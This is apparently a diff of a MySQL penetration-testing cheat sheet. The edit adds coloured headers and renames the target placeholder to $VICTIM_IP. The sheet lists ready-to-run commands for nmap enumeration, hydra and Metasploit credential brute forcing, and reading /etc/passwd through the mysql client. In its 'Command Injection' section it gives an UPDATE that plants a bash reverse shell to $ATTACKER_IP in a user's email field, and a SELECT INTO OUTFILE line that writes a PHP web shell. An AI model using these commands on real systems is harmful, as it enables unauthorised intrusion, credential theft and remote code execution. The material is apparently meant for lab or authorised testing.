@@ -1,34 +1,34 @@
-# Commands
-### Enumeration
+# <span style="color:#FF5555">Commands</span>
+### <span style="color:#50FA7B">Enumeration</span>
 ```bash
-nmap --script mysql-info -p 3306 <target-ip>
-nmap --script mysql-enum -p 3306 <target-ip>
-nmap --script mysql-brute -p 3306 <target-ip>
-nmap --script mysql-databases -p 3306 <target-ip>
-nmap --script mysql-users -p 3306 <target-ip>
-nmap --script mysql-* -p 3306 <target-ip>
+nmap --script mysql-info -p 3306 $VICTIM_IP
+nmap --script mysql-enum -p 3306 $VICTIM_IP
+nmap --script mysql-brute -p 3306 $VICTIM_IP
+nmap --script mysql-databases -p 3306 $VICTIM_IP
+nmap --script mysql-users -p 3306 $VICTIM_IP
+nmap --script mysql-* -p 3306 $VICTIM_IP
 ```
-### Brute Force Credentials
+### <span style="color:#50FA7B">Brute Force Credentials</span>
 ```bash
-hydra -l username -P passwords.txt <target-ip> mysql
-hydra -L usernames.txt -p password <target-ip> mysql
+hydra -l username -P passwords.txt $VICTIM_IP mysql
+hydra -L usernames.txt -p password $VICTIM_IP mysql
 
 # Metasploit
 msfconsole
 msf> use auxiliary/scanner/postgres/postgres_login
-msf> set rhosts <target-ip>
+msf> set rhosts $VICTIM_IP
 msf> run
 ```
 
-## Config File
+## <span style="color:#8BE9FD">Config File</span>
 ```bash
 cat /etc/mysql/my.cnf
 cat /etc/mysql/mysql.conf.d/mysqld.cnf
 ```
 
-### Connect
+### <span style="color:#50FA7B">Connect</span>
 
-#### Local
+#### <span style="color:#FFB86C">Local</span>
 ```bash
 # No password
 mysql -u username
@@ -52,20 +52,20 @@ mysql -u username --password='password' database_name -v < /etc/passwd
 
 ```
 
-#### Remote
+#### <span style="color:#FFB86C">Remote</span>
 ```bash
-mysql -u username -p -h <target-ip> -P 3306
+mysql -u username -p -h $VICTIM_IP -P 3306
 
 # Without password (remove -p)
-mysql -u username -h <target-ip> -P 3306
+mysql -u username -h $VICTIM_IP -P 3306
 
 # Specify database (-D)
-mysql -u username -p -h <target-ip> -D database_name
+mysql -u username -p -h $VICTIM_IP -D database_name
 
 # Default credential (username: root, no password)
-mysql -u root -h <target-ip> -P 3306
+mysql -u root -h $VICTIM_IP -P 3306
 ```
-### Execute from File
+### <span style="color:#50FA7B">Execute from File</span>
 After connecting MySQL, you can execute SQL commands from a .sql file.
 Note that we need to change the current directory to the directory in which the .sql file is located.
 
@@ -73,7 +73,7 @@ Note that we need to change the current directory to the directory in which the 
 mysql> source example.sql
 ```
 
-### Basic Commands
+### <span style="color:#50FA7B">Basic Commands</span>
 
 ```bash
 # List mysql users
@@ -99,12 +99,12 @@ mysql> show tables like 'user%';
 mysql> show tables from <database> like 'user%';
 ```
 
-### Command Injection
+### <span style="color:#50FA7B">Command Injection</span>
 We can inject the OS command to column values e.g. email address.
 Depending on the situation, we may be able to execute arbitrary command.
 ```bash
 # Update existing user email to execute reverse shell
-mysql> update exampledb.users SET email='admin@shell|| bash -c "bash -i >& /dev/tcp/10.0.0.1/1234 0>&1" &' where name like 'admin%';
+mysql> update exampledb.users SET email='admin@shell|| bash -c "bash -i >& /dev/tcp/$ATTACKER_IP/1234 0>&1" &' where name like 'admin%';
 
 # rev shell
 `SELECT "<?php echo shell_exec($_GET['cmd']); ?>" INTO OUTFILE '/xampp/htdocs/rev.php';`
